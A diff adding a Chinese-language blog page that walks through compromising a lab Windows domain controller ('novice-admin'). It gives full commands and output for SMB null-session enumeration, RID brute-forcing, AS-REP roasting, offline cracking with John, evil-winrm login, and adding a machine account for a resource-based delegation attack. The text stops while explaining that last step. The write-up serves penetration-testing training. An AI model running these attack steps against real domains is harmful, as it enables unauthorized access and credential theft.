@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# **一、信息收集**
+
+## **1.1 主机发现**
+
+首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。">
+<meta property="og:title" content="内部_novice-admin">
+<meta property="og:description" content="# **一、信息收集**
+
+## **1.1 主机发现**
+
+首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_novice-admin</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_novice-admin</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/227" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
+<h2><strong>1.1 主机发现</strong></h2>
+<p>首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。我们使用 <code class="notranslate">arp-scan</code> 对本地 <code class="notranslate">eth0</code> 网卡所在的 <code class="notranslate">192.168.205.0/24</code> 网段进行扫描，寻找存活主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l      
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.132 00:0c:29:19:38:d9       VMware, Inc.
+192.168.205.254 00:50:56:e9:e4:2e       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 2.005 seconds (127.68 hosts/sec). 4 responded</pre></div>
+<p>扫描结果显示，IP地址为 <code class="notranslate">192.168.205.132</code> 的主机处于活动状态，我们将其确定为本次渗透测试的目标。</p>
+<h2><strong>1.2 端口与服务扫描</strong></h2>
+<p>为全面了解目标主机开放的服务和潜在的攻击面，我们使用 <code class="notranslate">nmap</code> 结合一个自定义脚本 <code class="notranslate">windowport.sh</code> 来进行深入的端口和服务扫描。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat windowport.sh 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+nmap -p0-65535 <span class="pl-smi">$1</span> -oA nmapscan/ports
+ports=<span class="pl-s"><span class="pl-pds">$(</span>grep open nmapscan/ports.nmap <span class="pl-k">|</span> awk -F <span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span> <span class="pl-k">|</span> paste -sd <span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
+nmap -p<span class="pl-smi">$ports</span> -sC -sV -T4 <span class="pl-smi">$1</span> -oA nmapscan/xiports
+nmap --script=vuln -p<span class="pl-smi">$ports</span> <span class="pl-smi">$1</span> -oA nmapscan/vuln</pre></div>
+<p>执行该脚本对目标 <code class="notranslate">192.168.205.132</code> 进行扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ bash windowport.sh 192.168.205.132
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:37 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.132
+Host is up (0.00073s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+62319/tcp open  unknown
+62320/tcp open  unknown
+62333/tcp open  unknown
+62352/tcp open  unknown
+MAC Address: 00:0C:29:19:38:D9 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 104.79 seconds
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:39 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.132
+Host is up (0.00027s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 02:39:17Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds<span class="pl-k">?</span>
+464/tcp   open  kpasswd5<span class="pl-k">?</span>
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<span class="pl-k">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="pl-k">|</span>_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+62319/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+62320/tcp open  msrpc         Microsoft Windows RPC
+62333/tcp open  msrpc         Microsoft Windows RPC
+62352/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: 00:0C:29:19:38:D9 (VMware)
+Service Info: Host: DC<span class="pl-k">;</span> OS: Windows<span class="pl-k">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="pl-k">|</span>_nbstat: NetBIOS name: DC, NetBIOS user: <span class="pl-k">&lt;</span>unknown<span class="pl-k">&gt;</span>, NetBIOS MAC: 00:0c:29:19:38:d9 (VMware)
+<span class="pl-k">|</span>_clock-skew: -1s
+<span class="pl-k">|</span> smb2-time: 
+<span class="pl-k">|</span>   date: 2025-08-23T02:40:05
+<span class="pl-k">|</span>_  start_date: N/A
+<span class="pl-k">|</span> smb2-security-mode: 
+<span class="pl-k">|</span>   3:1:1: 
+<span class="pl-k">|</span>_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 94.32 seconds
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:40 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.132
+Host is up (0.00050s latency).
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+62319/tcp open  unknown
+62320/tcp open  unknown
+62333/tcp open  unknown
+62352/tcp open  unknown
+MAC Address: 00:0C:29:19:38:D9 (VMware)
+
+Host script results:
+<span class="pl-k">|</span>_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+<span class="pl-k">|</span>_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+<span class="pl-k">|</span>_smb-vuln-ms10-054: <span class="pl-c1">false</span>
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 123.45 seconds</pre></div>
+<p><strong>扫描结果分析：</strong></p>
+<ul>
+<li><strong>服务识别</strong>：开放了 Kerberos(88)、LDAP(389)、SMB(445)、WinRM(5985) 等多个关键端口。</li>
+<li><strong>系统角色</strong>：服务信息明确指出这是一台 <code class="notranslate">Microsoft Windows Active Directory LDAP</code> 服务器，结合其主机名 <code class="notranslate">DC</code> 和域名 <code class="notranslate">novice.com</code>，可以确定其为域控制器。</li>
+<li><strong>攻击向量</strong>：基于开放的服务，初步的攻击思路将围绕活动目录认证协议（Kerberos, LDAP）和文件共享服务（SMB）展开。</li>
+</ul>
+<hr>
+<h1><strong>二、漏洞利用与初始立足点</strong></h1>
+<h2><strong>2.1 SMB匿名枚举</strong></h2>
+<p>从 SMB 服务入手，使用 <code class="notranslate">smbclient</code> 尝试对目标进行匿名访问，列出其共享文件夹。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ smbclient -L //192.168.205.132/ -N       
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      远程管理
+        C$              Disk      默认共享
+        IPC$            IPC       远程 IPC
+        NETLOGON        Disk      Logon server share 
+        nothinghere     Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 <span class="pl-k">for</span> workgroup listing.
+do_connect: Connection to 192.168.205.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</pre></div>
+<p>成功列出了多个共享，其中 <code class="notranslate">nothinghere</code> 看起来比较可疑。我们尝试匿名连接到这个共享并查看其内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ smbclient //192.168.205.132/nothinghere -N
+Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
+smb: <span class="pl-cce">\&gt;</span> ls
+  <span class="pl-c1">.</span>                                   D        0  Mon Aug 18 08:03:56 2025
+  ..                                DHS        0  Mon Aug 18 08:05:08 2025
+  readme.txt                          A      135  Mon Aug 18 07:57:00 2025
+
+                12923135 blocks of size 4096. 9365851 blocks available
+smb: <span class="pl-cce">\&gt;</span> get readme.txt 
+getting file <span class="pl-cce">\r</span>eadme.txt of size 135 as readme.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span>
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat readme.txt   
+It’s not about this directory — the key point is your anonymous permissions. Think about what you can <span class="pl-k">do</span> with SMB anonymous access.</pre></div>
+<p><code class="notranslate">readme.txt</code> 文件的内容给出了明确的提示：关键在于利用 SMB 的匿名访问权限进行下一步操作。</p>
+<h2><strong>2.2 域内用户枚举</strong></h2>
+<p>利用已知的 SMB 匿名登录权限（空会话），可以使用 <code class="notranslate">impacket</code> 工具集中的 <code class="notranslate">lookupsid.py</code> 脚本，通过暴力猜解 RID (Relative ID) 的方式来枚举域内的用户和组。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[<span class="pl-k">*</span>] Brute forcing SIDs at 192.168.205.132
+[<span class="pl-k">*</span>] StringBinding ncacn_np:192.168.205.132[<span class="pl-cce">\p</span>ipe<span class="pl-cce">\l</span>sarpc]
+[<span class="pl-k">*</span>] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491
+498: NOVICE<span class="pl-cce">\E</span>nterprise Read-only Domain Controllers (SidTypeGroup)
+500: NOVICE<span class="pl-cce">\A</span>dministrator (SidTypeUser)
+501: NOVICE<span class="pl-cce">\G</span>uest (SidTypeUser)
+502: NOVICE<span class="pl-cce">\k</span>rbtgt (SidTypeUser)
+512: NOVICE<span class="pl-cce">\D</span>omain Admins (SidTypeGroup)
+513: NOVICE<span class="pl-cce">\D</span>omain Users (SidTypeGroup)
+514: NOVICE<span class="pl-cce">\D</span>omain Guests (SidTypeGroup)
+515: NOVICE<span class="pl-cce">\D</span>omain Computers (SidTypeGroup)
+516: NOVICE<span class="pl-cce">\D</span>omain Controllers (SidTypeGroup)
+517: NOVICE<span class="pl-cce">\C</span>ert Publishers (SidTypeAlias)
+518: NOVICE<span class="pl-cce">\S</span>chema Admins (SidTypeGroup)
+519: NOVICE<span class="pl-cce">\E</span>nterprise Admins (SidTypeGroup)
+520: NOVICE<span class="pl-cce">\G</span>roup Policy Creator Owners (SidTypeGroup)
+521: NOVICE<span class="pl-cce">\R</span>ead-only Domain Controllers (SidTypeGroup)
+522: NOVICE<span class="pl-cce">\C</span>loneable Domain Controllers (SidTypeGroup)
+525: NOVICE<span class="pl-cce">\P</span>rotected Users (SidTypeGroup)
+526: NOVICE<span class="pl-cce">\K</span>ey Admins (SidTypeGroup)
+527: NOVICE<span class="pl-cce">\E</span>nterprise Key Admins (SidTypeGroup)
+553: NOVICE<span class="pl-cce">\R</span>AS and IAS Servers (SidTypeAlias)
+571: NOVICE<span class="pl-cce">\A</span>llowed RODC Password Replication Group (SidTypeAlias)
+572: NOVICE<span class="pl-cce">\D</span>enied RODC Password Replication Group (SidTypeAlias)
+1000: NOVICE<span class="pl-cce">\D</span>C$ (SidTypeUser)
+1101: NOVICE<span class="pl-cce">\D</span>nsAdmins (SidTypeAlias)
+1102: NOVICE<span class="pl-cce">\D</span>nsUpdateProxy (SidTypeGroup)
+1104: NOVICE<span class="pl-cce">\M</span>rRobot (SidTypeUser)</pre></div>
+<p>脚本成功枚举出了域 <code class="notranslate">NOVICE</code> 的 SID 以及多个用户和组，包括 <code class="notranslate">Administrator</code>、<code class="notranslate">krbtgt</code> 和一个名为 <code class="notranslate">MrRobot</code> 的普通用户。为了方便后续利用，我们将所有类型为 <code class="notranslate">SidTypeUser</code> 的用户名提取并保存到 <code class="notranslate">user</code> 文件中。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132 <span class="pl-k">2&gt;</span>/dev/null <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>(SidTypeUser)<span class="pl-pds">"</span></span> <span class="pl-k">|</span> cut -d <span class="pl-s"><span class="pl-pds">'</span>\<span class="pl-pds">'</span></span> -f2 <span class="pl-k">|</span> cut -d <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> -f1 <span class="pl-k">&gt;</span> user
+Password:
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat user      
+Administrator
+Guest
+krbtgt
+DC$
+MrRobot</pre></div>
+<h2><strong>2.3 AS-REP Roasting 攻击</strong></h2>
+<blockquote>
+<p><strong>知识点</strong>: AS-REP Roasting 是一种针对Kerberos认证的攻击。如果一个域用户的账户属性中设置了 “不需要Kerberos预身份验证” (<code class="notranslate">UF_DONT_REQUIRE_PREAUTH</code> is <code class="notranslate">True</code>)，那么任何攻击者都可以冒充该用户向KDC（密钥分发中心）请求认证票据（AS-REP）。KDC会直接返回一个用该用户密码哈希加密的TGT票据。攻击者可以截获这个票据并进行离线破解，从而获取用户明文密码。</p>
+</blockquote>
+<p>我们利用上一步获得的用户列表，使用 <code class="notranslate">GetNPUsers.py</code> 脚本尝试进行 AS-REP Roasting 攻击。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py novice.com/ -usersfile user -format john -outputfile <span class="pl-c1">hash</span> -no-pass -dc-ip 192.168.205.132
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User Administrator doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="pl-s">[-] User Guest doesn<span class="pl-pds">'</span></span>t have UF_DONT_REQUIRE_PREAUTH <span class="pl-c1">set</span>
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User DC$ doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="pl-s">$krb5asrep$MrRobot@NOVICE.COM:17037b58fa06936b306893c2184c444a$fdd9db20ebe37b4cd79a1847c9cb7b2cbee5fa22c21c180ad23bc22e4249b7d373d3cd31d083493258d493f0c6a2fd4e38847fff4d1b93c7d3803a754dc78e0649c7f678ff7c40a06faee8d5fbf461e4aa69769eaafaf1ddf24383126f5724027343ab0fd70dd8501a3bf9ef39b9e08c4112bab1180b2f316fd7bd3205feed3f8c0366120602d0226094881746adcda4609a5f303139c2845ee0817321575d2c9e648fff2d8f46a11f70c49e0f057bbe0ed7155a16819211dc0c20eee7c09b42c423e12df38d788b5975ed5fdf1b64b7572e4c041580475835258a4b5d474e89e3a2dbec797756d9</span></pre></div>
+<p>脚本的输出显示，用户 <code class="notranslate">MrRobot</code> 的账户存在此配置缺陷，并成功获取了其 AS-REP 哈希，已保存至 <code class="notranslate">hash</code> 文件中。</p>
+<h2><strong>2.4 离线密码破解</strong></h2>
+<p>接下来，使用 <code class="notranslate">John the Ripper</code> 配合强大的 <code class="notranslate">rockyou.txt</code> 字典，对获取到的哈希进行离线暴力破解。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="pl-c1">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
+Will run 8 OpenMP threads
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+mrroboto12       (<span class="pl-smi">$krb5asrep$MrRobot</span>@NOVICE.COM)     
+1g 0:00:00:01 DONE (2025-08-22 22:50) 0.5813g/s 3110Kp/s 3110Kc/s 3110KC/s mrsbrown89..mrkonochi
+Use the <span class="pl-s"><span class="pl-pds">"</span>--show<span class="pl-pds">"</span></span> option to display all of the cracked passwords reliably
+Session completed.</pre></div>
+<p>密码被成功破解，用户 <code class="notranslate">MrRobot</code> 的明文密码为 <code class="notranslate">mrroboto12</code>。</p>
+<h2><strong>2.5 远程登录获取立足点</strong></h2>
+<p>利用刚刚获取的凭据，通过 <code class="notranslate">evil-winrm</code> 登录目标主机的 WinRM 服务（5985端口），这将为我们提供一个交互式的 PowerShell Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ evil-winrm -i 192.168.205.132 -u <span class="pl-s"><span class="pl-pds">'</span>MrRobot<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>mrroboto12<span class="pl-pds">'</span></span>    
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="pl-s"><span class="pl-pds">`</span>quoting_detection_proc<span class="pl-s"><span class="pl-pds">'</span> for module Reline</span></span>
+<span class="pl-s"><span class="pl-s">                                        </span></span>
+<span class="pl-s"><span class="pl-s">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span>
+<span class="pl-s"><span class="pl-s">                                        </span></span>
+<span class="pl-s"><span class="pl-s">Info: Establishing connection to remote endpoint</span></span>
+<span class="pl-s"><span class="pl-s">*Evil-WinRM* PS C:\Users\MrRobot\Documents&gt; whoami /all</span></span></pre></div>
+<p>成功登录，我们已经在目标系统上获得了一个初始的立足点（Foothold）。</p>
+<hr>
+<h1><strong>三、权限提升</strong></h1>
+<h2><strong>3.1 权限分析</strong></h2>
+<p>为了规划下一步的提权路线，首先在远程Shell中执行 <code class="notranslate">whoami /all</code> 命令，查看当前用户 <code class="notranslate">MrRobot</code> 的详细权限信息。</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\MrRobot\Documents<span class="pl-k">&gt;</span> whoami <span class="pl-k">/</span>all
+
+用户信息
+<span class="pl-k">----------------</span>
+
+用户名         SID
+<span class="pl-k">==============</span> <span class="pl-k">==============================================</span>
+novice\mrrobot S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">3649830887</span><span class="pl-k">-</span><span class="pl-c1">1815587496</span><span class="pl-k">-</span><span class="pl-c1">1699028491</span><span class="pl-k">-</span><span class="pl-c1">1104</span>
+
+
+组信息
+<span class="pl-k">-----------------</span>
+
+组名                                        类型   SID          属性
+<span class="pl-k">===========================================</span> <span class="pl-k">======</span> <span class="pl-k">============</span> <span class="pl-k">==============================</span>
+Everyone                                    已知组 S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">0</span>      必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+BUILTIN\Remote Management Users             别名   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">32</span><span class="pl-k">-</span><span class="pl-c1">580</span> 必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+BUILTIN\Users                               别名   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">32</span><span class="pl-k">-</span><span class="pl-c1">545</span> 必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+BUILTIN\Pre<span class="pl-k">-</span>Windows <span class="pl-c1">2000</span> Compatible Access  别名   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">32</span><span class="pl-k">-</span><span class="pl-c1">554</span> 必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+NT AUTHORITY\NETWORK                        已知组 S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">2</span>      必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+NT AUTHORITY\Authenticated Users            已知组 S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">11</span>     必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+NT AUTHORITY\This Organization              已知组 S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">15</span>     必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+NT AUTHORITY\NTLM Authentication            已知组 S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">64</span><span class="pl-k">-</span><span class="pl-c1">10</span>  必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用的组
+Mandatory Label\Medium Plus Mandatory Level 标签   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">16</span><span class="pl-k">-</span><span class="pl-c1">8448</span>
+
+
+特权信息
+<span class="pl-k">----------------------</span>
+
+特权名                        描述             状态
+<span class="pl-k">=============================</span> <span class="pl-k">================</span> <span class="pl-k">======</span>
+SeMachineAccountPrivilege     将工作站添加到域 已启用
+SeChangeNotifyPrivilege       绕过遍历检查     已启用
+SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用
+
+
+用户声明信息
+<span class="pl-k">-----------------------</span>
+
+用户声明未知。
+
+已在此设备上禁用对动态访问控制的 Kerberos 支持。</pre></div>
+<p>输出结果中最引人注目的一点是，用户 <code class="notranslate">novice\mrrobot</code> 拥有 <code class="notranslate">SeMachineAccountPrivilege</code> 特权。</p>
+<blockquote>
+<p><strong>知识点</strong>: <code class="notranslate">SeMachineAccountPrivilege</code> 特权允许持有者将计算机加入到域中。在默认的Active Directory配置下，普通域用户拥有此权限，并且最多可以将10个机器账户添加到域中。攻击者可以滥用此权限，创建一个由自己完全控制的机器账户，并以此为跳板进行后续的委派攻击，最终实现权限提升。</p>
+</blockquote>
+<h2><strong>3.2 滥用机器账户配额</strong></h2>
+<p>我们利用 <code class="notranslate">SeMachineAccountPrivilege</code> 特权，使用 <code class="notranslate">addcomputer.py</code> 脚本以 <code class="notranslate">MrRobot</code> 的身份在域中添加一个名为 <code class="notranslate">NEWPC$</code> 的新机器账户，并为其设置一个我们已知的密码 <code class="notranslate">Password123!</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name <span class="pl-s"><span class="pl-pds">'</span>NEWPC$<span class="pl-pds">'</span></span> -computer-pass <span class="pl-s"><span class="pl-pds">'</span>Password123!<span class="pl-pds">'</span></span> -dc-ip 192.168.205.132 novice.com/MrRobot:mrroboto12
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[<span class="pl-k">*</span>] Successfully added machine account NEWPC$ with password Password123<span class="pl-k">!</span>.</pre></div>
+<p>机器账户创建成功，我们现在拥有了一个域内的新身份。</p>
+<h2><strong>3.3 配置基于资源的约束性委派 (RBCD)</strong></h2>
+<blockquote>
+<p><strong>知识点</strong>: 单纯创建一个机器账户并不能直接模拟管理员。我们需要配置域控制器，让它“信任”我们创建的 <code class="notranslate">NEWPC$</code> 账户可以代表其他用户（包括管理员）来请求服务。这个过程就是配置“基于资源的约束性委派”（RBCD）。我们通过修改域控主机对象（<code class="notranslate">DC$</code>）的 <code class="notranslate">msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，将我们控制的 <code class="notranslate">NEWPC$</code> 的SID添加进去，从而单向地建立信任关系。</p>
+</blockquote>
